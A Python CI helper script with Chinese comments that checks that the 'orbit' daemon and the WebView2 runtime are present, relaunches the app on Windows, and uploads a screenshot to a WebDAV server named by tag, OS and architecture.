import os
import platform
import subprocess
import sys
import urllib.request
import psutil
import time
import glob

# === 配置区 ===
WEBDAV_BASE_URL = "http://100.113.111.18:20002/opt/orbit-test/assets"

# 从环境变量获取 release-tag，如果读取不到则默认为 'dev'
# 你可以在 GitHub Actions 中设置环境变量： env: RELEASE_TAG: ${{ github.ref_name }}
RELEASE_TAG = os.environ.get("RELEASE_TAG", "dev")

def verify_orbit_processes():
    # 我们要捕获的目标核心关键字（不带后缀，全小写）
    target_targets = {"orbit", "orbitd"}
    found_procs = []

    print("\n" + "=" * 20 + " 🧬 跨平台守护进程状态审计 " + "=" * 20)

    # 遍历系统当前所有的进程
    for proc in psutil.process_iter(['pid', 'name', 'status', 'username', 'cmdline']):
        try:
            p_info = proc.info
            p_name = p_info['name']
            if not p_name:
                continue

            # 标准化处理：转小写，并剥离 Windows 的 .exe 后缀
            clean_name = p_name.lower().replace('.exe', '')

            if clean_name in target_targets:
                found_procs.append(p_info)
                print(
                    f"📌 [找到目标] PID: {p_info['pid']} | 进程名: {p_name} | 状态: {p_info['status']} | 运行用户: {p_info['username']}")
                if p_info['cmdline']:
                    print(f"   └─ 启动命令: {' '.join(p_info['cmdline'])}")

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            # 略过无权限访问或在遍历期间消亡的系统级进程
            continue

    print("-" * 67)
    if not found_procs:
        print("❌ 严重警告: 未找到任何运行中的 'orbit' 或 'orbitd' 进程！程序可能已崩溃或未被拉起。")

        # 🧪 兜底线索：如果没找到，打印出当前系统里前 15 个最活跃的进程，看看你的程序是不是变名字了
        print("\n🔍 正在抓取当前系统活跃进程快照（Top 15）供排查参考:")
        count = 0
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            if count < 15:
                print(f"   -> PID: {proc.info['pid']} | {proc.info['name']} ({proc.info['username']})")
                count += 1
    else:
        print(f"🎉 状态确认: 成功捕获到 {len(found_procs)} 个目标进程正在运行。")

    print("=" * 67 + "\n")


# 只有 Windows 平台才导入注册表模块
if sys.platform == "win32":
    import winreg


def check_webview2_installed():
    print("\n" + "=" * 20 + " 🍏 WebView2 环境深度审计 " + "=" * 20)

    # 优先检查：是否已经通过硬核环境变量指定了免注册表路径
    ci_env_path = os.environ.get("WEBVIEW2_BROWSER_EXECUTABLE_FOLDER")
    if ci_env_path and os.path.exists(ci_env_path):
        print(f"🎉 状态确认: 检测到硬核环境变量注入成功！")
        print(f"   └─ 正在通过免注册表路径运行: {ci_env_path}")
        print("=" * 60 + "\n")
        return True

    # 其次检查：传统的 Windows 注册表（保留作为兜底）
    if sys.platform == "win32":
        paths_to_check = [
            (
            winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9478C2F}"),
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9478C2F}")
        ]
        for hkey, subkey in paths_to_check:
            try:
                key = winreg.OpenKey(hkey, subkey)
                version, _ = winreg.QueryValueEx(key, "pv")
                print(f"🎉 状态确认: 成功在注册表抓到 WebView2 Runtime! 版本号: {version}")
                print("=" * 60 + "\n")
                return True
            except Exception:
                continue

    print("❌ 🚨 警告: 注册表与环境变量均未检测到有效的 WebView2 引擎！")
    print("=" * 60 + "\n")
    return False


def fix_and_relaunch_orbit():
    print("\n" + "=" * 20 + " 🛠️ 强制注入 WebView2 环境并重试 " + "=" * 20)

    # 1. 去 Choco 的默认释放路径下搜寻 msedgewebview2.exe 的实际深层目录
    choco_wv2_base = r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application"
    pattern = os.path.join(choco_wv2_base, "*", "msedgewebview2.exe")
    found_paths = glob.glob(pattern)

    if not found_paths:
        print("❌ 严重错误: 在磁盘上依然找不到 msedgewebview2.exe！环境彻底丢失。")
        return

    # 拿到包含 msedgewebview2.exe 的那个版本号文件夹路径
    webview2_dir = os.path.dirname(found_paths[0])
    print(f"🎯 成功在盘符定位到 WebView2 运行库: {webview2_dir}")

    # 2. 乱刀砍掉当前处于“无窗体活死人”状态的旧 orbit 进程，防止单实例锁死
    print("⏳ 正在清理旧的无响应目标进程...")
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in ["orbit.exe"]:
                proc.kill()
                print(f"   💥 已击杀旧进程: {proc.info['name']}")
        except Exception:
            pass

    time.sleep(2)  # 等待释放句柄

    # 3. 核心大招：强行注入微软官方认可的最高优先级环境变量
    os.environ["WEBVIEW2_BROWSER_EXECUTABLE_FOLDER"] = webview2_dir
    print(f"🚀 已注入环境变量: WEBVIEW2_BROWSER_EXECUTABLE_FOLDER = {webview2_dir}")

    # 4. 以最纯净的无参数模式，直接拉起主程序
    target_exe = r"C:\Orbit\orbit.exe"
    print(f"🎬 正在以全新环境（带参数）拉起: {target_exe}")
    try:
        # 🌟 将参数作为列表的第二个元素传入
        subprocess.Popen([target_exe, "--register-autostart"], env=os.environ)
        print("⏳ 等待 15 秒让 WebView2 引擎充分初始化并完成窗体渲染...")
        time.sleep(15)
    except Exception as e:
        print(f"❌ 拉起失败: {e}")

    print("=" * 60 + "\n")


def get_system_info():
    """获取格式化后的系统和架构名称"""
    sys_os = platform.system().lower()  # windows, linux, darwin
    arch = platform.machine().lower()  # amd64, x86_64, arm64

    # 统一命名规范
    if sys_os == "darwin":
        sys_os = "darwin"
    elif sys_os == "windows":
        sys_os = "windows"

    if "arm64" in arch or "aarch64" in arch:
        arch = "arm64"
    elif "64" in arch:
        arch = "x86_64"

    return sys_os, arch


def take_screenshot(name):
    """全平台原生截图（无需任何第三方库）"""
    sys_os = platform.system()
    try:
        if sys_os == "Windows":
            # 利用 PowerShell 原生 API 截图
            cmd = (
                "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; "
                "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
                "$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; "
                "$g = [System.Drawing.Graphics]::FromImage($bitmap); "
                "$g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); "
                f'$bitmap.Save("{name}", [System.Drawing.Imaging.ImageFormat]::Png)'
            )
            subprocess.run(["powershell", "-Command", cmd], check=True)

        elif sys_os == "Darwin":
            # macOS 原生命令行截图，-x 参数关闭快门声音
            subprocess.run(["screencapture", "-x", name], check=True)

        elif sys_os == "Linux":
            # Linux 使用 scrot 截图
            subprocess.run(["scrot", name], check=True)

        print(f"成功生成本地结果: {name}")
        return True
    except Exception as e:
        print(f"本地结果失败: {e}", file=sys.stderr)
        return False


def upload_to_webdav(local_file, remote_filename):
    """通过 WebDAV PUT 协议上传文件"""
    target_url = f"{WEBDAV_BASE_URL}/{remote_filename}"
    print(f"正在上传至 WebDAV: {target_url}")

    try:
        with open(local_file, "rb") as f:
            file_data = f.read()

        # 构造 WebDAV PUT 请求
        req = urllib.request.Request(
            target_url,
            data=file_data,
            headers={"Content-Type": "image/png"},
            method="PUT",
        )

        with urllib.request.urlopen(req) as response:
            if response.status in [200, 201, 204]:
                print("========================================")
                print(f"🎉 结果上传成功！")
                print("========================================")
            else:
                print(
                    f"上传响应异常，状态码: {response.status}",
                    file=sys.stderr,
                )
    except Exception as e:
        print(f"WebDAV 上传失败: {e}", file=sys.stderr)


if __name__ == "__main__":
    # 在你的分析逻辑开始前，先给进程做个体检
    verify_orbit_processes()

    if sys.platform == "win32":
        fix_and_relaunch_orbit()

    # 2. 注入新加入的两个方向排查
    check_webview2_installed()

    sys_os, arch = get_system_info()

    # 拼接目标文件名： {release-tag}-{os}-{arch}.png
    remote_filename = f"{RELEASE_TAG}-{sys_os}-{arch}.png"
    local_tmp_file = "tmp_screenshot.png"

    # 执行截图并上传
    if take_screenshot(local_tmp_file):
        upload_to_webdav(local_tmp_file, remote_filename)

        # 清理本地临时文件
        if os.path.exists(local_tmp_file):
            os.remove(local_tmp_file)